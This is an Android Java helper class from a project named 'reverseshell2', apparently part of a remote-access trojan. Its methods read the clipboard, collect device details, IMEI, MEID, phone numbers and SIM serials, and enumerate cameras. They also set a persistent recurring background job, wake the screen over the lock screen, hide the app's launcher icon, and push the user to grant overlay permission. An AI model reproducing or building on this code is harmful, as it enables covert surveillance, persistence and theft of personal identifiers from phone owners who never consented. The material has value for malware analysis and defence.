package com.example.reverseshell2;

import android.app.Activity;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ClipDescription;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraManager;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.WindowManager;
import android.widget.Toast;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AlertDialog;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.Locale;
import java.util.concurrent.TimeUnit;

import static android.content.Context.JOB_SCHEDULER_SERVICE;
import static android.Manifest.permission;


public class functions {

    Activity activity;
    private static final String TAG = "functionsClass";

    public functions(Activity activity){
        this.activity = activity;
    }

    public String deviceInfo() {
        String ret = "--------------------------------------------\n";
        ret += "Manufacturer: "+android.os.Build.MANUFACTURER+"\n";
        ret += "Version/Release: "+android.os.Build.VERSION.RELEASE+"\n";
        ret += "API Level: "+android.os.Build.VERSION.SDK_INT+"\n";
        ret += "Product: "+android.os.Build.PRODUCT+"\n";
        ret += "Model: "+android.os.Build.MODEL+"\n";
        ret += "Brand: "+android.os.Build.BRAND+"\n";
        ret += "Device: "+android.os.Build.DEVICE+"\n";
        ret += "Host: "+android.os.Build.HOST+"\n";
        ret += "Supported ABIs: "+String.join(", ", Build.SUPPORTED_ABIS)+"\n";
        ret += "--------------------------------------------\n";
        return ret;
    }

    public String readFromClipboard() {
        final ClipboardManager[] clipboard = new ClipboardManager[1];
        String result="";
        activity.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                clipboard[0] = (ClipboardManager) activity.getSystemService(Context.CLIPBOARD_SERVICE);
            }
        });
        try{
            if (clipboard[0].hasPrimaryClip()) {
                android.content.ClipDescription description = clipboard[0].getPrimaryClipDescription();
                android.content.ClipData data = clipboard[0].getPrimaryClip();
                if (data != null && description != null && description.hasMimeType(ClipDescription.MIMETYPE_TEXT_PLAIN))
                    result= String.valueOf(data.getItemAt(0).getText());
                if(result.isEmpty()){
                    result = null;
                }
            }
        }catch (NullPointerException e){
            result=null;
        }
        return result;
    }

    public String get_numberOfCameras() {
        String camera_details = "";
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            // Use Camera2 API for Android 5.0+
            CameraManager cameraManager = (CameraManager) 
                    activity.getSystemService(Context.CAMERA_SERVICE);
            try {
                String[] cameraIds = cameraManager.getCameraIdList();
                for (String cameraId : cameraIds) {
                    CameraCharacteristics characteristics = 
                            cameraManager.getCameraCharacteristics(cameraId);
                    Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                    if (facing != null) {
                        if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
                            camera_details += cameraId + " -- Front Camera\n";
                        } else if (facing == CameraCharacteristics.LENS_FACING_BACK) {
                            camera_details += cameraId + " -- Back Camera\n";
                        } else if (facing == CameraCharacteristics.LENS_FACING_EXTERNAL) {
                            camera_details += cameraId + " -- External Camera\n";
                        }
                    }
                }
            } catch (CameraAccessException e) {
                camera_details = "Error: Camera access exception: " + e.getMessage() + "\n";
                e.printStackTrace();
            }
        } else {
            // Use legacy Camera API for older versions
            Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
            for (int i = 0; i < Camera.getNumberOfCameras(); i++) {
                Camera.getCameraInfo(i, cameraInfo);
                if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    camera_details += i + " -- Front Camera\n";
                } else if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                    camera_details += i + " -- Back Camera\n";
                }
            }
        }
        
        if (camera_details.isEmpty()) {
            camera_details = "No cameras found or access denied\n";
        }
        
        return camera_details;
    }

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    public void jobScheduler(Context context){
        ComponentName componentName = new ComponentName(context, jobScheduler.class);
        
        JobInfo.Builder builder = new JobInfo.Builder(123, componentName)
                .setPersisted(true);
        
        // Set different parameters based on Android version
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            // Android 7.0+ has minimum periodic interval of 15 minutes
            builder.setPeriodic(15 * 60 * 1000); // 15 minutes in milliseconds
        } else {
            builder.setPeriodic(900000); // 15 minutes in milliseconds for older versions
        }
        
        // Add network type constraint for efficiency in newer versions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            builder.setEstimatedNetworkBytes(
                    JobInfo.NETWORK_BYTES_UNKNOWN, 
                    JobInfo.NETWORK_BYTES_UNKNOWN);
        }

        JobScheduler scheduler = (JobScheduler) context.getSystemService(JOB_SCHEDULER_SERVICE);
        int resultCode = scheduler.schedule(builder.build());
        if (resultCode == JobScheduler.RESULT_SUCCESS) {
            Log.d(TAG, "Job scheduled successfully");
        } else {
            Log.d(TAG, "Job scheduling failed");
        }
    }

    public String getPhoneNumber(Context context) {
        TelephonyManager phoneMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        StringBuilder out = new StringBuilder();

        // Check permissions
        boolean hasPhoneStatePermission = ActivityCompat.checkSelfPermission(context, 
                permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED;
        boolean hasPhoneNumbersPermission = Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && 
                ActivityCompat.checkSelfPermission(context, 
                permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED;
        
        if (!hasPhoneStatePermission) {
            return "READ_PHONE_STATE permission not granted\n";
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && !hasPhoneNumbersPermission) {
            out.append("READ_PHONE_NUMBERS permission not granted (required for Android 10+)\n");
        }

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                if (SubscriptionManager.from(activity).getActiveSubscriptionInfoCount() > 0) {
                    String lst = "";
                    String header="";
                    for (int i = 0; i < SubscriptionManager.from(activity).getActiveSubscriptionInfoList().size(); i++) {
                        if(i==0){
                            header="First Sim: ";
                        }else if(i==1){
                            header = "Second Sim: ";
                        }else if(i==2){
                            header = "Third Sim: ";
                        }
                        lst += header+"--------------------------";
                        lst += "\nCALL STATE : "+phoneMgr.createForSubscriptionId(i).getCallState();
                        
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            if (ActivityCompat.checkSelfPermission(context, permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                                try {
                                    lst += "\nIMEI NUMBER : " + phoneMgr.createForSubscriptionId(i).getImei();
                                    lst += "\nMEI NUMBER : " + phoneMgr.createForSubscriptionId(i).getMeid();
                                } catch (SecurityException e) {
                                    lst += "\nIMEI/MEID access denied: " + e.getMessage();
                                }
                            } else {
                                lst += "\nIMEI/MEID requires READ_PHONE_STATE permission";
                            }
                        }
                        
                        try {
                            lst += "\nMOBILE NUMBER : " + phoneMgr.createForSubscriptionId(i).getLine1Number();
                        } catch (SecurityException e) {
                            lst += "\nMOBILE NUMBER access denied";
                        }
                        
                        try {
                            lst += "\nSERIAL NUMBER : " + phoneMgr.createForSubscriptionId(i).getSimSerialNumber();
                            lst += "\nSIM OPERATOR NAME : " + phoneMgr.createForSubscriptionId(i).getSimOperatorName();
                            lst += "\nSIM STATE : " + phoneMgr.createForSubscriptionId(i).getSimState();
                            lst += "\nCOUNTRY ISO : " + phoneMgr.createForSubscriptionId(i).getSimCountryIso() + "\n";
                        } catch (SecurityException e) {
                            lst += "\nSIM information access denied";
                        }
                        
                        lst += "\n";
                    }
                    out.append(lst);
                }
            } else {
                StringBuilder lst = new StringBuilder();
                lst.append("CALL STATE : ").append(phoneMgr.getCallState()).append("\n");
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    if (ActivityCompat.checkSelfPermission(context, permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                        lst.append("IMEI NUMBER : ").append(phoneMgr.getImei()).append("\n");
                        lst.append("MEI NUMBER : ").append(phoneMgr.getMeid()).append("\n");
                    } else {
                        lst.append("IMEI/MEID requires READ_PHONE_STATE permission\n");
                    }
                }
                
                try {
                    lst.append("MOBILE NUMBER : ").append(phoneMgr.getLine1Number()).append("\n");
                    lst.append("SERIAL NUMBER : ").append(phoneMgr.getSimSerialNumber()).append("\n");
                    lst.append("SIM OPERATOR NAME : ").append(phoneMgr.getSimOperatorName()).append("\n");
                    lst.append("SIM STATE : ").append(phoneMgr.getSimState()).append("\n");
                    lst.append("COUNTRY ISO : ").append(phoneMgr.getSimCountryIso()).append("\n");
                } catch (SecurityException e) {
                    lst.append("SIM information access denied: ").append(e.getMessage()).append("\n");
                }
                
                out.append(lst);
            }
        } catch (Exception e) {
            out.append("Error retrieving phone information: ").append(e.getMessage()).append("\n");
        }
        
        return out.toString();
    }

    public void getScreenUp(Activity activity){
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            activity.setShowWhenLocked(true);
            activity.setTurnScreenOn(true);
        } else {
            // Legacy method for older versions
            activity.getWindow().addFlags(
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
                | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED);
        }
    }

    public void hideAppIcon(Context context){
        PackageManager p = context.getPackageManager();
        ComponentName componentName = new ComponentName(context, com.example.reverseshell2.MainActivity.class);
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    public void unHideAppIcon(Context context){
        PackageManager p = context.getPackageManager();
        ComponentName componentName = new ComponentName(context, com.example.reverseshell2.MainActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    public void overlayChecker(final Context context){
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(context)) {
                if ("xiaomi".equals(Build.MANUFACTURER.toLowerCase(Locale.ROOT))) {
                    final Intent intent = new Intent("miui.intent.action.APP_PERM_EDITOR");
                    intent.setClassName("com.miui.securitycenter",
                            "com.miui.permcenter.permissions.PermissionsEditorActivity");
                    intent.putExtra("extra_pkgname", context.getPackageName());
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    Toast.makeText(context, "Enable the display pop-up windows while running in background option", Toast.LENGTH_SHORT).show();
                    context.startActivity(intent);
                } else {
                    Intent overlaySettings = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, 
                            Uri.parse("package:" + context.getPackageName()));
                    activity.startActivityForResult(overlaySettings, 1);
                }
            }
        }
    }

    public void createNotiChannel(Context context) {
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O){
            // Create channel for normal notifications
            NotificationChannel mainChannel = new NotificationChannel(
                    "channelid",
                    "Service Notifications",
                    NotificationManager.IMPORTANCE_LOW);
            mainChannel.setDescription("Used for background service notifications");
            
            // Create high priority channel for important notifications (Android 13+ requires)
            NotificationChannel highPriorityChannel = new NotificationChannel(
                    "high_priority_channel",
                    "Important Notifications",
                    NotificationManager.IMPORTANCE_HIGH);
            highPriorityChannel.setDescription("Used for important alerts");
            highPriorityChannel.enableVibration(true);
            
            NotificationManager manager = context.getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(mainChannel);
                manager.createNotificationChannel(highPriorityChannel);
            }
        }
    }
}
